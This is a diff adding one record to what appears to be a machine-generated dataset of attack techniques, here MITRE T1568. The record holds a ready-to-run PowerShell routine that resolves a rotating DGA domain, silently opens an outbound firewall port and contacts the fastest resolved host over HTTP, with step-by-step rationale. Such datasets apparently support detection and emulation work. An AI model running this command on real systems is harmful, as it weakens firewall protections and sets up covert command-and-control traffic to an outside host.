@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('api{0}.rollingdns.net' -f (Get-Date -Format 'HHmm')); $arec=Resolve-DnsName $dom -Type A -Server '1.1.1.1' -ErrorAction SilentlyContinue; if($arec){ netsh advfirewall firewall add rule name='out_65200' dir=out action=allow protocol=TCP remoteport=65200 | Out-Null; $best=$null; $min=999999; foreach($ip in ($arec | ForEach-Object IPAddress)){ $sw=[Diagnostics.Stopwatch]::StartNew(); $ok=(Test-NetConnection -ComputerName $ip -Port 65200 -InformationLevel Quiet); $sw.Stop(); if($ok -and $sw.ElapsedMilliseconds -lt $min){ $min=$sw.ElapsedMilliseconds; $best=$ip } }; if($best){ Invoke-WebRequest -Uri ('http://{0}:65200/sync' -f $best) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 5 } } }",
+  "explanation": "Resolves a DGA domain with multiple A records, times TCP connects to select the lowest-latency IP, opens port 65200, and then contacts the optimal endpoint.",
+  "rationale_steps": [
+    "Resolve the DGA domain to obtain a pool of IPs.",
+    "Benchmark TCP connection times to avoid unstable nodes.",
+    "Allow outbound traffic to an uncommon high port.",
+    "Connect to the selected IP while maintaining the original Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-ae93c803",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
